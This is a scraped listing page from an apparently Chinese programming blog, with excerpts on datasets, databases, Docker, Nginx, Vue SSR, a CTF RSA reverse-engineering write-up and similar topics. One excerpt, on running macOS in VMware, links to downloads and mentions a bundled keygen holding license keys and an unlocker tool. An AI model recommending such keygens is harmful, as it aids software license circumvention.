链接：https://pan.baidu.com/s/1GchE1ztsG6EZhKe271zj7g
提取码：zhpw
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7b7487768a738db83b94b4b9be2eb0e6/" rel="bookmark">
			医疗图像这6个数据集，赶紧收藏备用！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 平台的数据集版块，共有257个不同类别，不同应用的数据集。
本周在此基础上，又上新6种动物相关的数据集，目前总共有263种数据集。
（1）脑神经扫描fastMRI数据集
数据集图片：
数据集内容：fastMRI数据集包括两种类型的MRI扫描数据集：膝盖MRI和脑（神经）MRI，由纽约大学医学院放射学系，和纽约大学朗格尼健康学院的高级影像创新与研究中心进行收集。
数据集数量：
fastMRI数据集主要包含两方面的数据：
（1）膝部MRI数据集：1500多个膝部MRI图像数据，以及10000张临床膝部MRI的DICOM数据图像。
（2）脑部MRI数据集：6970个完全采样的脑部MRI数据。
数据集功能：图像分割
详情可查看↓↓↓
（2）BraTS肿瘤分割数据集
数据集图片：
数据集内容：BraTS肿瘤分割数据集是一个脑肿瘤分割挑战数据集，所有成像数据集均由1到4个标定人员手动分割，并且由经验丰富的神经放射科医生进行二次确认。
数据集功能：图像分割
详情可查看↓↓↓
（3）胸部MIMIC-CXR数据库
数据集图片：
数据集内容：胸部放射线影像是一种常用的影像学检查手段，用于对胸部进行影像学研究。胸部X光片可用于识别急性和慢性心肺疾病，验证起搏器，中心线和导管等设备的位置是否正确，并有助于进行相关的医学检查。
MIMIC-CXR数据集，是DICOM格式的大型公共胸部X射线数据集，带有自由文本放射学报告。
数据集数量：MIMIC-CXR数据集包含377110张X射线图像
数据集功能：图像分割
详情可查看↓↓↓
（4）OASIS-3阿尔茨海默氏图像数据集
数据集图片：
数据集内容：OASIS-3阿尔茨海默氏图像数据集，是一个大脑神经影像数据集。主要包含正常衰老和阿尔茨海默氏病的纵向神经影像，来源临床数据。
OASIS-3数据集是30年来，通过WUSTL Knight ADRC在多个正在进行的项目中，收集的超过1000名参与者的数据。
主要包括609名认知正常的成年人，和489名处于认知衰退各个阶段的人，年龄从42-95岁不等。
数据集数量：OASIS-3数据集包含2168个图像数据
数据集功能：图像分割
详情可查看↓↓↓
（5）胸部NIH Chest X-ray数据集
数据集图片：
数据集内容：NIH Chest X-ray数据集是一个胸部X射线数据集，由美国国立卫生研究院临床中心发布，总共收集了30000多名患者的，100000多张胸部X射线数据集，其中包括许多患有晚期肺部疾病的患者。
数据集数量：NIH Chest X-ray数据集包含30000多名患者的，100000多张胸部X射线数据集
数据集功能：图像分割
详情可查看↓↓↓
（6）牙齿Bitewing Radiology数据集
数据集图片：
数据集内容：龋齿是牙齿的一种可传播的细菌性疾病，会破坏牙齿的结构，因此牙医要根据X射线图像来诊断和治疗龋齿，Bitewing Radiology数据集是一个牙齿X射线数据集，用来对牙齿的不同部位进行图像分割。
数据集数量：Bitewing Radiology数据集包含120位患者的120张牙齿图像
数据集功能：图像分割
详情可查看↓↓↓
希望数据集对你有帮助！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9bd6c538f00c545aff46a4288abdad33/" rel="bookmark">
			c&#43;&#43;静态成员变量的初始化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		普通静态变量的初始化 #include&lt;iostream&gt; using namespace std; int main() { static int sa;//普通静态变量 //普通静态变量定义时分配内存，系统自动初始化为0 cout &lt;&lt; sa &lt;&lt; endl; return 0; } 静态成员变量的初始化 参考以下文章
c++静态成员变量的初始化
#include&lt;iostream&gt; using namespace std; class A { public: static int cnt; }; int main() { A a; static int sa;//普通静态变量 cout &lt;&lt; sa &lt;&lt; endl;//0 cout &lt;&lt; A::cnt &lt;&lt; endl; cout &lt;&lt; sizeof(A) &lt;&lt; endl;//1 return 0; } /* 上述代码会报错，错误	2	error LNK2001: 无法解析的外部符号 "public: static int A::cnt"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9bd6c538f00c545aff46a4288abdad33/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/57055dff03eef52a6df4fa1ef50104e3/" rel="bookmark">
			Oracle数据库一次插入多条数据-----insert all方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当我们想要一次性插入多条数据时，MySQL和Oracle是有区别的。
MySQL MySQL一次性插入多条数据参考如下：
https://blog.csdn.net/weixin_45137708/article/details/120866268
Oracle 常用的插入数据的方法id是采用sequence自增，每次循环，都会查询一次sequence，然后插入一条数据，这就导致性能极低。通过改成一次插入多条数据，id通过触发器自动设置，不再每次先查询sequence，这样效率可以提高很多。
由于insert all方式插入多条数据时，通过sequence获取的值是同一个，不会自动获取多个，所以id需要通过其他方式设置(这里采用触发器方式自动设置id)
步骤如下：
1.创建表
id为主键，通过sequence产生主键值。
create table student( id number(10) primary key, name varchar2(30), age number(10), address varchar2(50) ) 2.创建序列
create sequence seq_student minvalue 1 maxvalue 999999999999999999999999 start with 1 increment by 1 cache 20; //指定存入缓存序列值的个数，默认值20 3.创建触发器
通过触发器自动给insert语句设置id值
create or replace trigger tr_student before insert on student for each row begin select seq_student.nextval into :new.data_id from dual; end; 4.插入数据
insert all into student(name,age,address) values('lily',23,'北京') into student(name,age,address) values('Tom',32,'上海') into student(name,age,address) values('Jim',18,'重庆') select * from dual; 这样就比单条插入数据高效很多。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/57055dff03eef52a6df4fa1ef50104e3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c5392ed49d64a0d6dbf70a11e753ddae/" rel="bookmark">
			Win7、Win10中Protel99se不能加载库文件解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自：Win7、Win10中Protel99se不能加载库文件解决方法 - 道客巴巴
Win7以后系统中Protel99se不能加载库文件解决方法
在win7下安装Protel99se会出现无法添加原理图库,元件库的情况。
如图，提示“file not recognized”。
方法（推荐）：
利用原理图Find Component功能:
首先，添加原理图库，在**.sch文件中点击“Find”（下图）
在“Path”中找到存放设计的文件夹，点击“Find now”（下图）
再点击“close”即可;
2)PCB库的添加
如果在C:\Windows下找不到Advpcb99se.ini，不是没有安装这个文件，而是这个文件被安装到了用户目录下面去了(C:\Users\(自己的用户
名)\AppData\Local\VirtualStore\Windows)，将这个文件复制到C:\windows下。修改这个文件，如下内容
Count=3
File0=D&gt;MSACCESS:$RP&gt;d:\Program Files\Design Explorer 99 SE\Library\Pcb\Generic Footprints$RN&gt;Advpcb.ddb$OP&gt;$ON&gt;PCB Footprints.lib$ID&gt;-1$ATTR&gt;0$E&gt;PCBLIB$STF&gt; File1=D&gt;MSACCESS:$RP&gt;D:\Program Files\Design Explorer 99
SE\Library\Pcb\Connectors$RN&gt;Miscellaneous Connectors.ddb$OP&gt;$ON&gt;Miscellaneous Connectors.lib$ID&gt;-1$ATTR&gt;0$E&gt;PCBLIB$STF&gt;
File2=D&gt;MSACCESS:$RP&gt;F:\Evan99seLIB$RN&gt;MyPCBlib.Ddb$OP&gt;$ON&gt;MyPCBLib.L IB$ID&gt;41$ATTR&gt;0$E&gt;PCBLib$STF&gt;
保存退出即可。
注意PCB库文件有一个ID值，每一个文件的ID都不同，一般方法是从XP里面的这个文件里去获取。当然也有最简单的方法，那就是在DDB文件里，lib文件直接放在最顶层，不要放在任何文件里，这样的话这个ID就是-1(Protel自带的元件库这个值都是-1就是这个原因吧)。这个方法不一定可靠，但是目前还没发现出错，加载不了的。
注意：如果改的是C:\windowns下面的advpcb99se.ini那么就只有以管理员权限运行才加载那些库，这样在平时使用会觉得挺麻烦。解决办法就是修改C:\Users\(用户
名)\AppData\Local\VirtualStore\Windows下的advpcb99seini，这样就不需要管理员权限运行了。(因为普通运行时就是从用户目录下加载的这个文件)，【Win10x64下测试发现，只有修改该目录下的文件才可成功添加PCB封装库，修改windows下的文件无效】
附上：
PCB ADVPCB99SE.INI
[Import File]
Path=*.*
Prompt=Import File
SelFileType=
EditorName=All
Sel File Type=
WholeProject=False
TypeCount=6
Count=0
[Export File]
Path=*.*
Prompt=Export File
SelFileType=
EditorName=All
Sel File Type=
WholeProject=False
TypeCount=7
Count=0
[PCB Libraries]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c5392ed49d64a0d6dbf70a11e753ddae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/766f1d891a0f6cc6bfa68b86d87c20dc/" rel="bookmark">
			vue-srr 实现原理内附完整代码（ vuex、vue-router、syncData )
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		vue-ssr demo 链接 https://github.com/zenghao1998/vue-ssr/tree/main Vue SSR 什么是 SSR 服务端渲染：凡是是从服务器返回的html页面，均算作是服务端渲染，包括php，jsp,nodejs，
SSR 的优点 更好的 SEO
更快的内容到达时间
为什么使用 SSR 在传统 vue 单页面应用中，页面的渲染都是由 js 完成，在服务端返回的html文件中，body中只有一个div标签和一个script标签，页面其余的dom结构都将由bundle.js生成，然后挂载到&lt;div id="app"&gt;&lt;/div&gt;上。这让搜索引擎爬虫抓取工具无法爬取页面的内容，如果 SEO 对你的站点很重要，则你可能需要服务器端渲染(SSR)解决此问题。
SSR 基本使用 ssr 的本质就服务端返回渲染好的 html 文档。我们先在项目根目录启动一个服务器，然后返回一个html 文档。这里我们使用 express 作为服务端框架。
const server = require('express')() server.get('*', (req, res) =&gt; { res.end(`&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt;&lt;title&gt;Vue SSR&lt;/title&gt;&lt;/head&gt; &lt;body&gt; &lt;div&gt;This is a server render page&lt;/div&gt; &lt;/body&gt; &lt;/html&gt;`) }) server.listen(8088, () =&gt; { console.log('http://127.0.0.1:8088') }) 打开 http://127.0.0.1:8088 右键查看源代码 ，服务端返回的内容如下。
vue 使用 SSR 一个最简单官方示例
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/766f1d891a0f6cc6bfa68b86d87c20dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ca61d85f8429cf9afebfa055d9e0fb2/" rel="bookmark">
			bash命令的使用方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小编给大家分享一下bash命令的使用方法，相信大部分人都还不怎么了解，因此分享这篇文章给大家参考一下，希望大家阅读完这篇文章后大有收获，下面让我们一起去了解一下吧！ Bash（Bash）是 Bourne Again Shell的缩写，用于执行描述命令（如Linux中的命令）的shell。 在Linux上采用bash作为标准，基本上它描述了对带有“.sh”扩展名的vi编辑器等文本的处理并执行。 与编程一样，它有许多函数，如变量，函数和算术处理，所以如果你是一个小程序，你可以用bash编写它。 此外，由于bash是由shell执行的，因此它也称为shell脚本。 创建一个shell脚本 我们首先创建一个简单的脚本，将“Hello World !！”输出到控制台。 使用vi命令创建新文件。 $ vi hello.sh打开编辑器后，按如下所示编写。 #!/usr/bin/bashecho "Hello World!!"exit 0第一行上的“＃！/ usr / bin / bash”表示它是使用bash的shell脚本。 第二行描述了要执行的语句。 最后，使用“exit 0”退出 bash。参数0表示正常结束。 创建文件后，使用bash命令执行shell脚本。 $ bash hello.sh执行结果： Hello World!!Hello World !!已输出 此外，在执行shell脚本时的命令除了bash以外，还有改变执行权限用“./”运行的。 $ chmod 755 hello.sh$ ./hello.sh有一种用 sh命令执行的方法。 $ sh hello.shshell脚本可以编写注释以及编程。 注释可以在“＃”之后写出。 #!/usr/bin/bashecho "Hello World!!"#结束处理。exit 0Shell脚本可以定义变量和赋值。 #!/usr/bin/bash num=100PI=3.14STR1="Hello"str_2="World!!" echo ${num}echo ${PI}echo ${STR1}echo ${str_2} exit 0变量可以是字母数字字符，例如大写字母和小写字母，数字和下划线（_）。 为变量赋值时，请将其写为“变量 = 值”。 请注意，如果在“=”之前和之后放置空格，则会导致错误。 此外，在访问变量时，需要在变量名称之前添加“$”，如“$ {变量}”，将变量用“{}”括起来。 输入和输出 #!/usr/bin/bash read AGEecho "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ca61d85f8429cf9afebfa055d9e0fb2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e075a1e316c56df965ee935e96085428/" rel="bookmark">
			docker启动elasticsearch问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题1： max virtual memory areas vm.max_map_count [65530] is too low, increase to at least [262144]
答：在宿主机上修改
echo "vm.max_map_count=262144" &gt;&gt; /etc/sysctl.conf sysctl -w vm.max_map_count=262144 https://www.elastic.co/guide/en/elasticsearch/reference/5.4/docker.html
问题2： initial heap size [134217728] not equal to maximum heap size [536870912]; this can cause resize pauses and prevents mlockall from locking the entire heap
答：修改启动参数 Xms = Xmx
environment: - "ES_JAVA_OPTS=-Xms512m -Xmx512m" 问题3： 无法进行远程连接访问 9300端口NoNodeAvailableException[None of the configured nodes are available:
答：这种错误发生的原因是elasticsearch从5版本以后默认不开启远程连接，需要修改相关配置文件。
修改/usr/share/elasticsearch.yml，将transport.host:0.0.0.0前的#去掉。其作用是允许任何ip地址访问elasticsearch，开发测试阶段可以这么做，生产环境下指定具体的IP。
docker cp elasticsearch:/usr/share/elasticsearch/config/elasticsearch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e075a1e316c56df965ee935e96085428/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/489c3ed8855ed33bb46f24345a3e0cfb/" rel="bookmark">
			Precision（准确率）和Recall（召回率）介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 为什么我们需要Precision(准确率)和Recall(召回率)？ 首先我们仅仅只看loss的话，会出现什么问题。
举个例子：比如对于一个二分类的模型，我们通过训练得到最终loss仅为5%，也就是准确率达到了95%，这很明显我们认为这是一个比较优秀的模型。
但是，如果我们的训练数据，仅有3%的数据对应标签为0，也就是负样本，其余均为正样本，对应标签为1.
这样会发生什么？如果我们的网络只能输出1，无论输入是什么，都只能输出1，这样的模型的准确率为97%，那么这样的模型是更好的模型么？显然不是。
所以，这时候就需要用到precision和recall了
precision和reall precision= TP / (TP + FP)
recall= TP / (TP + FN)
很多人疑惑，这两个公式到底是什么意思？
precision即为预测为正确的数据中，真实值为正确的比例，而recall即为在所有的真实值为正确的数据中，有多少能预测正确。
很难理解，那我举一个癌症的例子，现在有一批人，其中有一些人得了癌症，一些人没有得癌症。
对于precision来说，我只有有很大的把握得时候，我才会说你得癌症，意思是，只要我说你得癌症，你基本上就是得了癌症。
对于recll来说，在这一批人当中，我基本能找到所有得癌症的人，意思是，得癌症的人一定在我说得癌症的人当中。
具体一点，现在有300个人，100个得癌症，我现在预测出只有10个人得癌症，那我的precision一定非常高，如果我现在预测出300个人得癌症，那我的recall一定非常高。
但是两者都不是我们想要的，所以我们需要权衡两者，才能找到最优秀得网络模型
对recall和precision仍有疑问，可继续在评论区留言 如果错误，欢迎大家及时指正！！！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2a105909ecf519d49f083bdef906c62d/" rel="bookmark">
			docker配置java环境（dockerfile方式）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、安装包准备 准备Centos镜像：
jdk和tomcat压缩包：
2、构建容器 2.1、编写构建文件 在存放安装包的目录下创建构建文件：
vi Dockerfile 在Dockerfile添加以下代码：
#依赖镜像名称和ID FROM daocloud.io/library/centos:6.8 #指定镜像创建者信息 MAINTAINER alinlx #切换工作目录 ADD jdk-8u181-linux-x64.tar.gz /opt/jdk ADD apache-tomcat-9.0.50.tar.gz /opt/tomcat #配置java环境变量 ENV JAVA_HOME /opt/jdk/jdk1.8.0_181 ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar ENV PATH $PATH:$JAVA_HOME/bin RUN chmod +x /opt/tomcat/apache-tomcat-9.0.50/bin/*.sh EXPOSE 8080 ENTRYPOINT /opt/tomcat/apache-tomcat-9.0.50/bin/startup.sh &amp;&amp; /bin/bash 参数解释：
FROM daocloud.io/library/centos:6.8
以centos6.8为基础构建容器
ADD jdk-8u181-linux-x64.tar.gz /opt/jdk/
ADD apache-tomcat-9.0.50.tar.gz /opt/tomcat/
添加两个压缩包，docker会自动解压好，/opt/ 是解压的文件位置
ENV JAVA_HOME /opt/jdk
ENV CLASSPATH J A V A H O M E / l i b / d t .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2a105909ecf519d49f083bdef906c62d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/def933fbbe450a39069389bbd706a688/" rel="bookmark">
			实现通过Xcode安装到虚拟机后安装iPhone模拟器并安装ipa软件到模拟器上
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言一、安装虚拟机1.准备工作2.开始安装 二、通过虚拟机创建一个mac 系统1.创建新的虚拟机2.创建苹果用户 三,安装VMware-Tool1.下载VMware-Tool需要的文件2 更新VMware-Tool 四 安装Xcode五 ,通过 Xcode 安装ipa到iPhone手机上1 手机连接虚拟机2 开机进入Xcode3 连接手机 总结 前言 最近通过vue写的h5 通过平台打包成ipa后 因为没有iPhone测试 只能自己搞个模拟器 路途坎坷~准备好踩坑的鞋吧~ 一、安装虚拟机 1.准备工作 ①首先是虚拟机的安装包:链接：https://pan.baidu.com/s/168XrIBwfGwmWLczstdcU0A
提取码：1111
②对应mac镜像:链接：https://pan.baidu.com/s/10LjvSPgiz4MfrwQAm0ebWA
提取码：1111
(别问为啥要mac 其它也可以 不过要是苹果的才行 这就是苹果的封闭手段~)
③为虚拟就准备苹果系统的映像(在网上搜搜darwin.iso下载 应该可以得到很多对应的文件 不过都是外网下载比较慢):
链接：https://pan.baidu.com/s/1B1kQDm5anq24BMEal5kg2w
提取码：1111
④在苹果开发者中心申请个Apple ID 这是官网https://developer.apple.com/ (最好搞一个 这个不复杂很快可以搞定)
2.开始安装 ①解压得到虚拟机的安装包 直接打开安装即可
其中有个KevGen 压缩包 你可能会用得到 这里面有秘钥
一直下一步,下一步 注意安装路径 自己要记住
② 下载得到mac的镜像 先下载下来后面会用到
③下载得到映像 你会得到一个 unlocker-main文件夹 将这个文件夹 放到虚拟机的安装路径下(之前让记住的那个路径)
然后打开该文件夹 运行win-install.cmd文件 会出现一个黑窗口 运行后会自动关闭 (这是给虚拟机添加mac镜像选项)
二、通过虚拟机创建一个mac 系统 1.创建新的虚拟机 ①经典和自定义 都可以 只是自定需要自己定义一些东西 想块点的话 也可以选经典 (毕竟后面也可自定义 ) 然后下一步
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/def933fbbe450a39069389bbd706a688/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d028a120658db4b39b53df243a4d4579/" rel="bookmark">
			springboot-缓存管理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 一、使用springboot默认的缓存管理在启动类上加上@EnableCaching ，代表开启Spring Boot基于注解的缓存管理支持所有缓存注解使用都在Service层下缓存的注解：缓存注解的常用属性 二、springboot整合Redis缓存实现1.基于注解的Redis缓存实现2.基于API的Redis缓存实现自定义RedisCacheManager缓存管理器的默认序列化机制 springboot默认使用Simple缓存组件进行缓存管理，Simple组件位于9大缓存组件最后一个（按顺序启用），所以，当没有其他缓存组件引入时，就使用Simple缓存组件，即springboot默认提供的缓存组件
缓存的作用：减少系统查询时间，执行查询时，会先从缓存中查询数据，如果缓存中没有，再去数据库中查询，然后把查询到的数据放到缓存中。（更新操作，会先删除缓存，再存入缓存；删除操作，删除缓存）
一、使用springboot默认的缓存管理 在启动类上加上@EnableCaching ，代表开启Spring Boot基于注解的缓存管理支持 @EnableCaching	//开启Spring Boot基于注解的缓存管理支持 @SpringBootApplication public class CacheApplication { public static void main(String[] args) { SpringApplication.run(CacheApplication.class, args); } } 所有缓存注解使用都在Service层下 缓存的注解： @EnableCaching：开关性注解，在项目启动类或某个配置类上使用此注解后，则表示允许使用注解的方式进行缓存操作
@Cacheable：可用于类或方法上；在目标方法执行前，会根据key先去缓存中查询看是否有数据，有就直接
返回缓存中的key对应的value值。不再执行目标方法；无则执行目标方法，并将方法的返回值
作为value，并以键值对的形式存入缓存
**@CachePut：**可用于类或方法上；在执行完目标方法后，并将方法的返回值作为value，并以键值对的形式存入缓存中
**@CacheEvict：**可用于类或方法上；在执行完目标方法后，清除缓存中对应key的数据(如果缓存
中有对应key的数据缓存的话)
**@Caching：**此注解即可作为@Cacheable、@CacheEvict、@CachePut三种注解中的的任何一种或几种来使用
@CacheConfig：@Cacheable、@CacheEvict、@CachePut这三个注解的cacheNames属性是必
填项(或value属性是必填项,因为value属性是cacheNames的别名属性)；如果上述
三种注解都用的是同一个cacheNames的话，那么在每此都写cacheNames的话，
就会显得麻烦。如将@CacheConfig注解就是来配置一些公共属性(如：cacheNames、
keyGenerator等)的值的
缓存注解的常用属性 cacheNames/values：指定缓存组件的名字，将方法的返回结果放在哪个缓存中，是数组的方式，可以指定多个缓存
key：缓存数据的标识。默认是使用方法参数的值
condition：指定符合条件的情况下才缓存； 如：condition = “#a0&gt;1” 即第一个参数值大于1时才进行缓存
unless：否定缓存；当unless指定的条件为true，方法的返回值就不会被缓存；可以获取到的结果进行判断
如： unless = “#a0”：如果第一个参数值是2，则结果不缓存
unless = “#result == null” 结果为null不缓存 @Service public class CommentService { @Autowired private CommentRepository commentRepository; // 根据评论id查询评论信息 // @Cacheable(cacheNames = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d028a120658db4b39b53df243a4d4579/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dde52d4fd9666da6c8e508b63b07e1c2/" rel="bookmark">
			苹果电脑Xcode快速打开苹果模拟器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Xcode 不用打开代码快速启动模拟器 下载好Xcode，打开Preferences
下载对应的ios系统版本
在访达中右键点击Xcode，点击显示包内容
根据这个目录找到Simulator，这个就是模拟器了。点击就能打开，还可以右键制作替身放在其他地方快速打开，
在程序坞中可以更改手机机型。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5e51b6e78da0241e5953295595c517b0/" rel="bookmark">
			Nginx&#43;Tomcat负载均衡集群
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
前言
一、Nginx+Tomcat
二、配置Nginx服务器
三、部署Tomcat应用服务器
总结
前言 介绍Tomcat及Nginx+Tomcat负载均衡集群，Tomcat的应用场景，然后重点介绍Tomcat的安装配置。Nginx+Tomcat负载均衡集案列是应用于生产环境的一套可靠的Web站点解决方案。
一、Nginx+Tomcat 通常情况下，一个Tomcat站点由于可能出现单点故障及无法应付过多客户复杂多样的请求等问题，不能单独应用于生产环境下，所以我们需要一套更可靠的解决方案来完善Web站点架构。
Nginx是一款非常优秀的http服务器软件，它能够支持高达50000个并发连接数的相应，拥有强大的静态资源的处理能力，运行稳定，并且内存、CPU等系统资源消耗非常低。目前很多大型网站都应用Nginx服务器为后端网站程序的反向代理及负载均衡器，来提升整个站点的负载并发能力。
部署环境
主机操作系统IP地址主要软件 Nginx服务器
CentOS 7.4 x86_64
192.168.196.146
nginx-1.12.2.tar.gz
Tomcat服务器1
CentOS 7.4 x86_64
192.168.196.147
①apache-tomcat-9.0.16.tar.gz / ②jdk-8u201-linux-x64.rpm
Tomcat服务器2
CentOS 7.4 x86_64
192.168.196.153
①apache-tomcat-9.0.16.tar.gz / ② jdk-8u201-linux-x64.rpm
二、配置Nginx服务器 1.关闭防火墙相关服务
[root@localhost ~]# systemctl stop firewalld [root@localhost ~]# systemctl disable firewalld [root@localhost ~]# setenforce 0 [root@localhost ~]# vim /etc/resolv.conf nameserver 114.114.114.114 2.安装依赖包
[root@nginx ~]# yum install -y gcc gcc-c++ pcre-devel zlib-devel make 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5e51b6e78da0241e5953295595c517b0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/035a14a9f04e375a2436f42b4a0e93e7/" rel="bookmark">
			使用 -Wl,rpath设置动态库的指定搜索路径
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		工作中有时会遇到可执行程序运行时使用指定目录下的动态库，若是直接修改环境变量，可能会对其他程序产生影响，因此可以在编译时使用-Wl,rpath来指定运行时路径。
比如 /home/lib 下存在 libtest.so ， /home/test 下存在 test.c 和 libtest.so文件，编译出的可执行文件依赖动态库 libtest.so
/home |--lib -libtest.so |--test - test.c - libtest.so 假设想让可执行文件运行时使用lib下的动态库，可以使用如下命令
gcc -o test test.c -L./ libtest.so -Wl,-rpath='$ORIGIN/../lib' 其中 -L./ libtest.so 表示编译时使用当前目录下的 libtest.so 进行编译
-Wl,-rpath=’$ORIGIN/…/lib’ 表示运行可执行文件时，从 …/lib 中寻找所需要的动态库。
可以使用ldd命令查看可执行程序的依赖
# ldd test libtest.so =&gt; /home/test/../lib/libtest.so 通过 ldd 命令可知，test 运行时使用的动态库路径为 /home/test/…/lib
还有一种情况是可执行程序test使用的动态库为 libtest.so 而编译时使用的是libtest.so.1.1
比如目录就结构如下
/home |--lib -libtest.so.1.1 |--test - test.c - libtest.so.1.1 编译生成可执行文件
gcc -o test test.c -L./ libtest.so.1.1 -Wl,-rpath='$ORIGIN/.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/035a14a9f04e375a2436f42b4a0e93e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4586a79b6114861f03da655f99863cb3/" rel="bookmark">
			BUUCTF RE [SUCTF2019] SignIn
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		好 今日我们来刷ctf
查看文件发现是64位的文件 无壳 用ida64位打开它
发现gmpz_init_set_str，gmpz_powm这类函数
去搜一搜资料发现是GNU 高精度算法库 gmp文档资料
GMP(The GNU Multiple Precision Arithmetic Library)又叫GNU多精度算术库，是一个提供了很多操作高精度的大整数，浮点数的运算的算术库，几乎没有什么精度方面的限制，功能丰富。我刚接触到这个东西的时候是在学习PHP的过程中。GMP的主要目标应用领域是密码学的应用和研究、 互联网安全应用、 代数系统、 计算代数研究等。
一般用来搞密码学，比如像RSA之类的 int mpz_init_set_str (mpz t rop, const char *str, int base) //rop = str(转为base进制数) void mpz_powm (mpz t rop, const mpz t base, const mpz t exp, const mpz t [Function] mod) //rop = base^exp%mod mpz_powm像极了RSA
公钥加密”
密文 = 明文的e次幂模上n
公式：c ＝ m^e mod n
那这题就是
v6 = v6^v5 % v4
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4586a79b6114861f03da655f99863cb3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3f09594d4af39d932595332a46c841b3/" rel="bookmark">
			Git 报错 error: pathspec ‘XXX‘ did not match any file(s) known to git 报错解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题复现 ：
① 在本地分支切换到同事新创建的分支：
git checkout xxx ② 报错：
error: pathspec 'XXX' did not match any file(s) known to git 解决方法：
① 查看本地的所有的分支中是否有同事新创建的分支：
git branch -a ② 如果没看到，那么执行以下操作，这步是获取所有分支：
git fetch ③ 执行完会看到这样提示：
remote: Enumerating objects: 4, done. remote: Counting objects: 100% (4/4), done. Unpacking objects: 100% (4/4), 1.06 KiB | 90.00 KiB/s, done. From codeup.aliyun.com:5eeb0689892c58bb7c394ab5/pxb/pxb-fronted * [new branch] XXX -&gt; origin/XXX ④ 切换到远程同事分支:
git checkout origin/XXX 提示：
Note: switching to 'origin/XXX'.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3f09594d4af39d932595332a46c841b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/18b04e68b4b511291cf7f0c1ce2de421/" rel="bookmark">
			Centos7重置用户密码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Centos 7忘记密码时有单用户和光盘两种方式修改。
一、光盘启动方式
当系统无法启动，甚至无法进入单用户时，可通过安装光盘引导进入救援模式，对系统进行修复。
a）.把机器设置为光盘启动。
第一种方法：F2进入BIOS设置 BOOT---"CD-ROM Drive"为第一引导项。用上下箭头移动到CD-ROM上，再按“+” 上移目标到第一项，最后按F10 保存配置退出重启。自动进入光盘引导。
第二种方法：开机后，快按一下ESC,出现CD-ROM引导界面，用上下键头选择CD-ROM后回车进入光盘引导。
b).光盘引导进入
（1）出现下图时选择第三项"troubshooting" 然后按回车键。
